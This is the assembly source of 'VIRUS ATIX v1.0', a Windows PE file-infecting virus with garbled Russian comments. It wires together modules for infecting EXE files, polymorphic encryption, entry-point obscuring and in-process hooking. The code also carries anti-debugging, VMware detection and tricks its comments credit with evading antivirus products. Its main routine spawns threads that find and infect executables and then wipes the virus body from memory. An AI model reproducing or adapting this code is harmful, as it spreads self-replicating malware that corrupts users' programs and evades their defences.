;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;           
;                                                                                                        ; 
;																										 ;
;																										 ;    
;                xx  xxxxxxxx     xxxxxxxxxxxx xxx     xx     xxxxxxxx                         			 ;   
;              xxxxxxxxxxxxxxx    xxx xxxxxxx         xxxx    x xxxxxx xxxxxxx                 			 ;   
;               xxx       xxxx                        xxxx         xxx xxxxxxxx                			 ;   
;               xxx       xx x                        xxxx         xxx xxx                     			 ;   
;               xxx       xxxx          xxxx          xxxx         xxx xxx                     			 ;  
;              xxxx  x    x xx          xxxx          xxxx         xxx                         			 ;            
;              xxxx  x x  xxxx          xxxx          xxx                                      			 ;     
;              xxxx  xx   xxxx          xxx                        xxx  xx                     			 ;              
;              xxxx       xxxx          xxxx                       xxx xxx                     			 ;          
;              xxxx       xx x          xxxx          xxxx    xxxx xxx xxx                     			 ;               
;                xx       xxxx           xxx          xxxx    xxxxxxxx xxxxxxx                 			 ;                   
;               xxx       xxxx          xxxx           xxx               xxxxxx                			 ;                 
;                                                                                                        ;
;                                                                                                        ; 
;                                                                                                        ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;  
;																										 ; 
;										:)!																 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ;
;									 VIRUS ATIX														 	 ;
;																										 ; 
;										v1.0 															 ; 
;																										 ; 
;									   ������:															 ; 
;																										 ; 
;																										 ;
;[+] ��䥪�:			infect.asm 																		 ;
;						(+) exe-襪: 																	 ; 
;										(+) ���७��� ��᫥���� ᥪ樨								 ; 
;										(+) ���७��� �।��᫥���� ᥪ樨 :)! 						 ;  
;											(�᫨ ��᫥���� ᥪ�� .rsrc, � ��� ���ᮡ�ࠥ��� � 		 ; 
;											 � ᤢ������� ���।, � ��䥪� �ந�室�� � �।��᫥���� 	 ; 
;											 ᥪ��) - ⠪ ����� ������� ����� �� 						 ;  
;						(+) ��������, �� ��᫥���� ᥪ�� �� ����䥪祭� � �� ᮤ�ন� 䫠�� �� ������  ; 
;						(+) 䠩��� � � ���૥�� 														 ;
;						(+) � ⥪�饩 � �� ��� ��������� ��४���� (�⮨� ���稪) 					 ; 
;						(+) �� ���������� ��ਡ��� 䠩��												 ; 
;						(+) �� ��������� ��� ��᫥���� ����䨪�樨 䠩��								 ; 
;						(+) �஢�ઠ 䠩��� SfcIsFileProtected											 ; 
;						(+) ���४�஢�� CheckSum 䠩�� 												 ; 
;							(�᫨ CheckSum ����砫쭮 �� =0, � �� ⠪�� � ��⠥���) 					 ; 
;						(+) �஢�ઠ �� ����稥 � ���㫥��� 䫠���										 ; 
;							IMAGE_DLLCHARACTERISTICS_NO_SEH & IMAGE_DLLCHARACTERISTICS_NX_COMPAT, 		 ; 
;							� ⠪�� ���㫥��� ��४�ਨ LoadConfig 									 ; 
;						(+) etc																			 ; 
;																										 ; 
;[+] �������䨧�:		rang32.asm, xTG.asm, FiNE.asm, faka.asm  										 ; 
;						(+) ��� 																		 ; 
;						(+) ������� �ᯮ������� ����												 ; 
;						(+) + ����� �����樨 ������ ���襪 											 ; 
;						(+) ��������� ������ (����� � ����� ��� ��� ������� ���஡���� � ����) 	 ; 
;						(+) etc																			 ; 
;																										 ; 
;[+] UEP:				flea.asm (+ rang32.asm, + xTG.asm) 												 ; 
;						(+) ���																			 ; 
;						(+) ������� �ᯮ������� ����												 ; 
;						(+) uep (��) ������															 ; 
;						(+) �孨�� ������稬��� 														 ; 
;						(+) etc 																		 ; 
;																										 ; 
;[+] १����⭮���																						 ; 
;	 ��																									 ; 
;	 �����:			pprm.asm  																		 ; 
;						(+) ����䨪��� ⠡��窨 ������  												 ; 
;						(+) etc 																		 ; 
;																										 ; 
;[+] ����:			atix.asm, infect.asm, armour.asm  	  											 ; 
;						(+) ��⨮⫠���																	 ; 
;						(+) ������⨪�																 ; 
;						(+) �����쪠																	 ; 
;						(+) anti-sandbox																 ; 
;						(+) detect bpx 																	 ;   
;						(+) etc 																		 ; 
;																										 ; 
;[+] �������� ����㧪�:	payload.asm																		 ; 
;						(+) �맮� ���ᠣ�																 ; 
;						(+) etc 																		 ; 
;																										 ; 
;[+] ��㣨� ��:		etc 																			 ; 
;						(+) ���� �����-ᬥ饭�� 													 ;
;						(+) ���� ��୥��32 �१ PEB													 ;
;						(+) ���� ���ᮢ ���襪 ��⥬ �ࠢ����� ��襩 �� ����							 ;
;						(+) �����।����� � ����䨡�୮���											 ;
;						(+)	��⪠ ���� � ������ ���� �।��᫥����/��᫥���� ᥪ樨 �����, 			 ; 
;							��� (��⪠) �ᯮ������ �ᥣ�� � ࠧ��� ����� � 							 ;
;							��� (��⪠) �ᥣ�� ࠧ��� ��� ������ �����.                             	 ; 
;						(+) CRC32 and other CalcHash													 ; 
;						(+) ���� �㦭�� ������ ���襪 �� ��࠭�����, �ᥣ�� ��������� ������ 		 ; 
;							(� ���쭥�襬 ����� ᤥ���� ������ ࠧ��� + ����� ᠬ� ᮡ��)			 ; 
;						(+) etc 																		 ; 
;																										 ; 
;[+] ���� �� ��:																						 ; 
;						(+) Windows (x86): 2000, XP SP2/SP3, W7, VISTA.									 ;
;							Windows (x64): W7* (* - ���� ��� ᪮�४�஢��� �������)  			 ; 
;							! �� ��㣨� �� ��⨫���													 ; 
;																										 ; 
;[-] :																									 ; 
;						(-) ��᪨ ���� �㡫������� ��-�� �������. �� ������� ����� �� �⮣� ����������. ; 
;							����� �� ����ᠭ � 1-�� ��।� ��� ��� �������, � ��᫥ ��� ��� 		 ; 
;							��㣨� ��. 																 ; 
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; 
;																										 ; 
;ᯠᨡ� izee, tlo. EOF � ��㣨� �ਢ��� :)!															 ;  
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ; 
;						������� ��� ᥡ�...�����⢮ ��筮											 ; 
;																										 ;  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
               



												;m1x
											;pr0mix@mail.ru
										;EOF
										 



				   

		    


.386
.model flat,stdcall
option	casemap:none

include windows.inc
include	kernel32.inc

includelib kernel32.lib





;========================================================================================================
;�ᯮ����⥫�� ����� ��� ����祭�� ���� ��ப� ��� ��� ��直� �३ 
;========================================================================================================
pushsz	macro	szString:VARARG
	local	m1
	call	m1
	db		szString,0
	m1:
	endm
;======================================================================================================== 	  





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�������! 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
.code
xStart:
	assume	fs:flat 
	jmp		_xxx_ 





;========================================================================================================
;������祭�� �������/���㫥�/etc 
;========================================================================================================
inc_table:
include		xBase.asm							;����� ������ �㭪権 (��宦����� ��୥��, crc32 etc)
include		search.asm							;����� ���᪠ exe-襪   
include		rersrc.asm                             
include		infect.asm							;����� ��䥪� exe-襪     
include		payload.asm							;����� �������� ����㧪� (�맮� ���ᠣ�)       
include		armour.asm							;��⨮⫠��� � ��祥 (�� ��)  
include		rang32.asm							;��� 
;include		faka.asm						;����� ����� ����� ������祭 㦥 � xTG (xTG.asm) (������� ������ ���襪)   
include		xTG.asm								;������� �ᯮ������� ���� 
include		FinE.asm							;��������� ������     
include		flea.asm							;㥯 (��) ������
include		pprm.asm							;����� ���-����᭮� १����⭮�� 
;========================================================================================================



	     

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;�㭪�� xPPRMFunc
;१����⭠� �㭪� (��뢠���� ��। ����祭��� ���誮�)
;���� ����, �८�ࠧ�� ��� � ���� + ��᪠ � ��� �� ������� ��� 䠩�� � ��䥪�� �� 
;���� (stdcall) (xPPRMFunc(char *pszPath)):
;	pszPath - �����-� ��ࠬ���, � ������ ��砥 ���� � 䠩��/����� (+ ��������� ��᪠ � ���) 
;�����:
;	(+) ��䥪� �� 䠩��� �� ��� :)! + ��।�� �ࠢ����� ���⢥ 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xPPRMFunc:          
	pushad
	mov		esi,dword ptr [esp+24h]				;ESI - ��ப�  
	sub		esp,(MAX_PATH + 4) 
	mov		edi,esp
	call	GetDelta							;����稬 �����-ᬥ饭��   
	lea		ecx,dword ptr [xsehhandler+eax]
	push	ecx
	xor		edx,edx
	push	dword ptr fs:[edx]
	mov		dword ptr fs:[edx],esp				;�⠢�� �� ���� ��� ��ࠡ��稪 �᪫�祭��   
	lea		edx,dword ptr [Infect+eax] 
	push	4  
	call	RANG32								;��砩�� ��ࠧ�� ��।���� ���-�� 䠩���, ����� � ��砥 ��宦����� ����䥪⨬ 
	inc		eax									;���� �筮 :)!   

	push	edx									;�㭪�� ��䥪�  
	push	eax									;���-�� 䠩��� ��� ��䥪�     
	pushsz	'\*.*'								;��᪠    
	push	edi									;+ ����   

	push	esi
	call	xstrlen
	mov		ecx,eax  
	cld
	rep		movsb								;᪮���㥬 ��ப� � ᢮� ���� (� ���)       
	dec		edi
	xchg	eax,ecx
	mov		al,'\'
	std
	repne	scasb								;��०�� �� ��譥� (����/���/etc) 
	cld  
	inc		edi  
	and		byte ptr [edi],0     
	call	FindPE								;� ��뢠�� �㭪� ���᪠ ( + Infect) 䠩��� �� ��᪥  
	add		esp,(MAX_PATH + 4)          
	xor		eax,eax
	pop		dword ptr fs:[eax]
	pop		eax 
	popad
	ret		4 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;����� �㭪樨 xPPRMFunc 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 


                     


;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;�㭪� xThreadFunc1 
;�㭪�� ��� 1-�� ��� (� ����⢥ ��ࠬ��� ��।��� �����-ᬥ饭��)
;������ �㭪� ��� ��誨 � ��䥪�� �� 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xThreadFunc1:
	pushad
	mov		ebp,esp 
	mov		esi,dword ptr [ebp+24h] 
	lea		ecx,dword ptr [xsehhandler+esi]
	push	ecx
	xor		edx,edx
	push	dword ptr fs:[edx]
	mov		dword ptr fs:[edx],esp				;�⠢�� �� ���� ��� ��ࠡ��稪 �᪫�祭��   
	mov		eax,MAX_LEN  
	sub		esp,eax
	mov		ebx,esp  
	push	esp
	push	eax 
	call	xGetCurrentDirectoryA1				;����砥� ⥪����� ��४��� 
	    
	lea		eax,dword ptr [OEP+esi]
	push	dword ptr [eax]						;��࠭塞 ���� OEP 
	push	eax 

	lea		eax,dword ptr [Infect+esi]   
	push	eax 
	push	4   
	pushsz	'\*.*'   
	push	ebx 
	call	FindPE								;��뢠�� �㭪� ���᪠ exe襪,         
	pop		ecx									;�᫨ ��� ���� ������� - � ��।����� � ����⢥ ��ࠬ��� �㭪� Infect ����䥪�� ��   
	pop		dword ptr [ecx]						;����⠭�������� ���� OEP 

	add		esp,MAX_LEN
	xor		eax,eax
	pop		dword ptr fs:[eax]					;㡨ࠥ� ��� ��ࠡ��稪 �᪫�祭��   
	pop		ecx     

	mov		dword ptr [ebp+1Ch],eax				;� ��室��    
 	popad
 	ret		4
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;����� �㭪� xThreadFunc1 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;�㭪� xThreadFunc2 
;�㭪�� ��� 2-�� ��� (� ����⢥ ��ࠬ��� ��।��� �����-ᬥ饭��)
;������ �㭪� ���� �������� ����㧪� (�맮� ���ᠣ�)
;����� �ந�室�� �������஢���� ��� � 䨡��, ��⥬ �姤���� ������ 䨡�� � ��।��
;�ࠢ����� �� ��� ���� 䨡��  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xThreadFunc2:
	push	esi
	mov		esi,dword ptr [esp+08] 
	push	esi 
	call	xConvertThreadToFiber1				;������⨬ ��� � 䨡��  

	lea		edx,dword ptr [xFiberFunc1 + esi]
	push	esi
	push	edx
	push	00h 
	call	xCreateFiber1						;ᮧ���� ���� 䨡�� 

 	push	eax
 	call	xSwitchToFiber1						;� ��।��� �� ���� �ࠢ�����  

 	call	esi									;��� ��� ������� �� �믮������, �.�. ���� 䨡�� ��� ��� 䨡�� � ᥡ� (������� ret) 
 	ret  
	;pop		esi  
	;xor		eax,eax 
	;ret		4
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;����� �㭪� xThreadFunc2 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;�㭪� xThreadFunc3    
;�㭪�� ��� 3-�� ��� (� ����⢥ ��ࠬ��� ��।��� �����-ᬥ饭��)
;������ �㭪� �믮���� �������⥫��� ��⨮⫠��� :)!  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
xThreadFunc3:
	call	regSS
	call	xIsDebuggerPresent
	call	xNtGlobalFlag 
	xor		eax,eax
	ret		4 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;����� �㭪� xThreadFunc3 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;�㭪� xFiberFunc1
;�㭪� ��� ������ ᮧ������� (2-���) 䨡��
;�맮� ���ᠣ� (�������� ����㧪�) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xFiberFunc1: 
	pushsz	'atix greets you :)!'  
	call	MsgBox 
	ret 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;����� �㭪� xFiberFunc1 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 

  

	
 
;========================================================================================================
;�த������� ࠡ��� ������� 
;======================================================================================================== 
_xxx_:  
	cld       
;-------------------------------------------------------------------------------------------------------- 
	call	GetDelta
	xchg	eax,esi
	lea		ecx,dword ptr [xsehhandler+esi]
	push	ecx
	xor		edx,edx
	push	dword ptr fs:[edx]
	mov		dword ptr fs:[edx],esp				;�⠢�� ��� ��ࠡ��稪 �᪫�祭�� 
	push	ds									;� ����ਬ �᪫�祭�� 
;########################################################################################################
;��� ��� ��� ���������� ��� x64 - ⠪ ��� ��� ��� - ����⢨� ��⨢���������:
;x86:
;	ds=0x30 - ��ࠡ��稪
;	ds=0x40 - ����쪠
;x64:
;	ds=0x30 - ����쪠
;	ds=0x40 - ��ࠡ��稪 
;######################################################################################################## 
	mov		dx,30h								;����� ��� �।�⠢��� ᮡ�� ��⨮⫠��� + �������� �� ��ᯥ� 2010 (� �������� ����� ࠭��� ���ᨩ) & Bitdefender'a (�������� ����-� �� �� ��㣨� ���)  
	db		08Eh,0DAh							;mov	ds,dx
	ret
;-------------------------------------------------------------------------------------------------------- 
	add		dl,10h								;EDX = 40h  
	mov		ds,dx								;�� ���� �����쪠, �� ��� ࠧ �� OneCare + ��ᯥ� 2010 (�������� ��-� �� �� �� ���� �� ��)  	
;######################################################################################################## 
	pop		ds 
;-------------------------------------------------------------------------------------------------------- 	 
ivmwp_magic:									;��⥪� vmware    
	mov		eax,564D5868h   					;backdoor ; �����᪨� �����  
	push	0Ah									;����� ������� - ��।������ ���ᨨ 
	pop		ecx									;��।��� - backdoor-������� �� �믮������        
	mov		edx,5658h							;�����᪨� ���� ����-����䥩� 
	xor		ebx,ebx                                    
_bdc_:  
	in		eax,dx								;��뢠�� ������� 
	cmp		ebx,564D5868h						;�᫨ �� ���쪠, � ��ॠ���㥬 �� �� 
	jne		_otherf1_                            
	pushsz	'vmware magic port //xuita'     
	call	MsgBox
SizeVMh1	equ	$ - _bdc_	     
;-------------------------------------------------------------------------------------------------------- 	
;======================================================================================================== 
_otherf1_:										;����� ᮧ����� 3 ��⮪� 	
	xor		edi,edi 
	lea		ecx,dword ptr [esp-12]  
	lea		edx,dword ptr [xThreadFunc1 + esi]
	push	ecx
	push	edi
	push	esi
	push	edx
	push	edi             
	push	edi  
	call	xCreateThread1						;1-� ��⮪ ��� ���᪠ � ��䥪� 䠩���  
	push	eax
;-------------------------------------------------------------------------------------------------------- 	
	lea		ecx,dword ptr [esp-16]
	lea		edx,dword ptr [xThreadFunc2 + esi]
	push	ecx
	push	edi
	push	esi
	push	edx
	push	edi
	push	edi
	call	xCreateThread1						;2-�� ��⮪ ��� �������� ����㧪� (�맮� ���ᠣ�) 
	push	eax 								;��᫥ 2-�� ��⮪ ᪮���������� � 䨡�� � ᮧ���� ���� 䨡�� :)! 
;-------------------------------------------------------------------------------------------------------- 
	lea		ecx,dword ptr [esp-20]
	lea		edx,dword ptr [xThreadFunc3 + esi]
	push	ecx
	push	edi
	push	esi
	push	edx             
	push	edi
	push	edi
	call	xCreateThread1						;3-�� ��⮪ ��� �������⥫쭮� ��⨮⫠��� 
	push	eax 
	mov		eax,esp  
;--------------------------------------------------------------------------------------------------------
	push	INFINITE  
	push	01h
	push	eax          
	push	03h									;᪮�쪮 ��⮪�� �����? 
	call	xWaitForMultipleObjects1			;����, ����� �� ��஦����� (�஬� �᭮�����) ��⮪� ��ࠡ����    
;-------------------------------------------------------------------------------------------------------- 
	call	xCloseHandle1						;� ����뢠�� ���� ���� ��⮪�� 
	call	xCloseHandle1 
	call	xCloseHandle1 
;======================================================================================================== 
;-------------------------------------------------------------------------------------------------------- 	 
	xor		eax,eax								;᭨���� ࠭�� ���⠢����� ��� ��ࠡ��稪 �᪫�祭�� 
	pop		dword ptr fs:[eax]
	pop		eax 
;-------------------------------------------------------------------------------------------------------- 	 
	test	esi,esi								;�� 1-�� ���������?
	je		_1gen_  
;-------------------------------------------------------------------------------------------------------- 	         
	mov		edi,dword ptr fs:[30h]
	mov		edi,dword ptr [edi+08]				;EDI = ImageBase 	
	mov		ebx,edi   
	assume	edi:ptr IMAGE_DOS_HEADER
	add		edi,[edi].e_lfanew
	assume	edi:ptr IMAGE_NT_HEADERS 
	movzx	ecx,[edi].FileHeader.NumberOfSections  
	dec		ecx
	imul	ecx,ecx,sizeof (IMAGE_SECTION_HEADER) 
	movzx	edx,[edi].FileHeader.SizeOfOptionalHeader
	lea		edx,dword ptr [edi + 4 + sizeof (IMAGE_FILE_HEADER) + edx]
	assume	edx:ptr IMAGE_SECTION_HEADER 
	add		edx,ecx								;��६��⨬�� � ��᫥���� ᥪ�� (� ⠡��窥 ᥪ権)
	cmp		dword ptr [edx].Name1,'rsr.'		;�� ᥪ�� ����ᮢ? 
	;jmp		_notmyrsrc_ 
	jne		_notmyrsrc_							;�᫨ ���, � ��९�루���� �����
		 										;���� ��� ���� ���㫨�� ���� �� ⥫� ����쪠 (⠪ ��� �������� ⠬ �뫨 �㫨 (�������� �� ᥪ�� ������),       
												;� �᫨ �� ����� �� ���㫨��, ���⢠ ��᫥ ��।�� �� �ࠢ����� ����� �� ��ࠡ����)
	mov		eax,dword ptr [esp]					;� ��� (��᫥ ��ࠡ�⪨ 㥯) � ��� ���� �� call'��, ����� ��।��� �ࠢ����� 㦥 ���ਯ���					  
	push	edi 
	sub		eax,6								;ᤢ������� �� 6 ���� (� ��� ��������� ⠪�� � ������� ᥪ樨: mov reg32,<address>   call reg32 - ⠪ ��� � ��� ���� �� �⨬ �����,         
	mov		edi,dword ptr [eax]					;� ��� �㦭� ���祭�� <address>, ���⮬� �� � ᤢ������� �� 6 ���� �����) 	
	push	esi
	push	edi
	push	PAGE_READWRITE 
	push	MEM_RESERVE+MEM_COMMIT 
	push	VSIZE2 	  
	push	0
	call	xVirtualAlloc1						;�뤥��� ����㠫��� ������ ��� ����஢���� ��� ����� (⠪ ��� ��� � �⮬ ���� �� �㤥� �������) 
	xchg	eax,edi  
	lea		esi,[inc_table + esi]				;᪮���㥬 �� ������ � ���㫨, � ⠪�� ����室��� ��� ���쭥�襩 ࠡ��� ���� ⥫� �����  
	mov		ecx,VSIZE2
	push	edi     
	rep		movsb            
	pop		edx 
	add		edx,P2SIZE							;EDX = ���� � �뤥������ ����, � ���ண� ��筥� �믮�������   				 
	pop		edi 
	pop		esi 
_clear_end_:
	lea		ecx,dword ptr [_clear_end_ + esi]	;⥯��� ����� ���६ ���� �� ⥫� �����    
	sub		ecx,edi       
	xor		eax,eax 
	rep		stosb								;� ����塞 �� �����   
	pop		edi 

	jmp		edx									;� ��᫥ ��룠�� ����� �� �믮������ :)! (�� ��� � ����� ����)      

part2: 
P2SIZE		equ	$ - inc_table 
	call	GetDelta							;��� ��� ��� (� �����) �㤥� �믮���� 㦥 � ����� �뤥������ ���� (��� ��� �㤠 ᪮��஢��, � ����� �� �㤥� �����) 
	xchg	eax,esi 
;-------------------------------------------------------------------------------------------------------- 
_notmyrsrc_: 
	lea		ecx,dword ptr [esp-04]   
	push	ecx
	push	PAGE_READWRITE
	push	[edi].OptionalHeader.SizeOfImage 
	push	ebx                
	call	xVirtualProtect1					;ࠧ�訬 ������ 

	call	FLEA_RESTBYTES						;����⠭���� ࠭�� ��࠭���� �����     
             
	push	eax 
	call	FLEA_RESTSTACK						;����⠭���� ���   

	lea		eax,dword ptr [MsgBox+esi] ;[xPPRMFunc+esi] ;[MsgBox+esi] 
	push	ebx 
	push	eax         
	call	PPRM								;���墠⨬ �㦭� ��� ���誨 
	 
	push	12345678h 
	OEP		= dword ptr $-4						;����� �࠭���� ��� OEP 	       
_1gen_: 	
	ret											;���堫�:)! 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;��� ⠪�� ��������  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





;========================================================================================================
;const 
;======================================================================================================== 
MAX_LEN			equ		10Ch					;ࠧ��� ���� ��� ��ப � ��祣� 
SIZE_WFD		equ		144h					;ࠧ��� ���� ��� �������� WIN32_FIND_DATA  

VIRUS_SIZE		equ		$ - xStart				;ࠧ��� ����쪠  
VSIZE2			equ		$ - inc_table
MAX_FINE_SIZE	equ		50000h					;���ᨬ���� ࠧ��� ���� ��� ᮧ����� �������� (���ਯ�� + ��஢���� ��� � �.�.)        		
;========================================================================================================


	push	0
	call	ExitProcess 

end		xStart


;��� ᨫ�� - ᫠�� �ᥣ�� �� �����! 
 


